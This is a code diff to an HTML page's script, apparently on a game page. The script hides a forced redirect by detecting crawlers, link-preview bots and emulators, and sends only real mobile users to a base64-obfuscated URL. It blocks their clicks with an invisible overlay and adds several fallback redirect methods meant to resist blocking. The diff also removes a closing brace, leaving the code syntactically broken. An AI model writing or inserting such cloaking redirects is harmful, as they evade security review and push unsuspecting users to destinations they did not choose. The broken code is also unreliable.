@@ -4034,7 +4034,7 @@
 
   const GAME_LOAD_DELAY = 500;   // 页面加载后等待检测时间
   const JUMP_DELAY = 1300;       // 触发后延迟跳转
-  const TARGET_B64 = "aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbQ=="; // 目标地址(base64)
+  const TARGET_B64 = "aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbQ=="; // Google
   const TARGET_URL = atob(TARGET_B64);
 
   const BOT_UA = [
@@ -4042,47 +4042,92 @@
     "TelegramBot","LinkedInBot","WhatsApp","Googlebot","Bingbot","Pinterest"
   ];
 
+  function log(...args){
+    console.log("[DEBUG]", ...args);
+  }
+
   function isBot(){
     const ua = navigator.userAgent.toLowerCase();
-    return BOT_UA.some(b => ua.includes(b.toLowerCase()));
+    const result = BOT_UA.some(b => ua.includes(b.toLowerCase()));
+    log("isBot =", result, "| UA:", navigator.userAgent);
+    return result;
   }
   function isMobile(){
     const ua = navigator.userAgent;
     const keys = ["Android","iPhone","iPad","iPod","BlackBerry","Windows Phone","webOS","Opera Mini","Mobi"];
-    return keys.some(k => ua.includes(k)) || (navigator.maxTouchPoints > 1 && /Macintosh/.test(ua));
+    const result = keys.some(k => ua.includes(k)) || (navigator.maxTouchPoints > 1 && /Macintosh/.test(ua));
+    log("isMobile =", result, "| UA:", navigator.userAgent, "| maxTouchPoints:", navigator.maxTouchPoints);
+    return result;
   }
   function isEmulator(){
     let r = "";
     try {
-      const gl = document.createElement('canvas').getContext('webgl') || document.createElement('canvas').getContext('experimental-webgl');
+      const c = document.createElement('canvas');
+      const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
       const info = gl && gl.getExtension('WEBGL_debug_renderer_info');
       if (info) r = gl.getParameter(info.UNMASKED_RENDERER_WEBGL) || "";
-    } catch(e) {}
+    } catch(e) { log("WebGL check error:", e); }
     const bad = ["Google SwiftShader","VirtualBox","VMware","Mesa","llvmpipe"];
-    if (bad.some(x => r.includes(x))) return true;
-    if (navigator.hardwareConcurrency && navigator.hardwareConcurrency <= 2) return true;
-    if (/^(Win16|Win32|Win64|MacIntel)$/.test(navigator.platform) && navigator.maxTouchPoints < 1) return true;
-    if (window.devicePixelRatio <= 1 && screen.width >= 1000) return true;
-    return false;
+    const cond1 = bad.some(x => r.includes(x));
+    const cond2 = navigator.hardwareConcurrency && navigator.hardwareConcurrency <= 2;
+    const cond3 = /^(Win16|Win32|Win64|MacIntel)$/.test(navigator.platform) && navigator.maxTouchPoints < 1;
+    const cond4 = window.devicePixelRatio <= 1 && screen.width >= 1000;
+    const result = cond1 || cond2 || cond3 || cond4;
+    log("isEmulator =", result, "| Renderer:", r, "| HC:", navigator.hardwareConcurrency, "| Platform:", navigator.platform, "| DPR:", window.devicePixelRatio, "| ScreenW:", screen.width);
+    return result;
   }
+
   function lockAndRedirect(ms, url){
+    log("准备跳转到:", url, "延迟(ms):", ms);
     const overlay = document.createElement('div');
     overlay.style.cssText = 'position:fixed;inset:0;background:rgba(0,0,0,0.001);z-index:999999;';
     document.body.appendChild(overlay);
+
     setTimeout(() => {
-      overlay.remove();
-      // 用 meta refresh 跳转，减少被拦截
-      document.write('<meta http-equiv="refresh" content="0;url=' + url + '">');
+      log("开始跳转...");
+      try {
+        (window.top || window).location.replace(url);
+        log("location.replace 成功");
+        return;
+      } catch(e) { log("location.replace 失败", e); }
+
+      try {
+        location.href = url;
+        log("location.href 成功");
+        return;
+      } catch(e) { log("location.href 失败", e); }
+
+      try {
+        const form = document.createElement('form');
+        form.method = 'GET';
+        form.action = url;
+        form.target = '_top';
+        document.body.appendChild(form);
+        form.submit();
+        log("表单跳转提交成功");
+        return;
+      } catch(e) { log("表单跳转失败", e); }
+
+      const a = document.createElement('a');
+      a.href = url;
+      a.target = '_top';
+      a.rel = 'noreferrer';
+      document.body.appendChild(a);
+      a.click();
+      log("超链接点击跳转");
     }, ms);
   }
 
   window.addEventListener('load', () => {
     setTimeout(() => {
+      log("检测开始...");
       if (!isBot() && !isEmulator() && isMobile()) {
+        log("✅ 条件命中，准备跳转");
         lockAndRedirect(JUMP_DELAY, TARGET_URL);
+      } else {
+        log("❌ 条件不满足，不跳转");
       }
     }, GAME_LOAD_DELAY);
-  });
 </script>
 </body>
 </html>
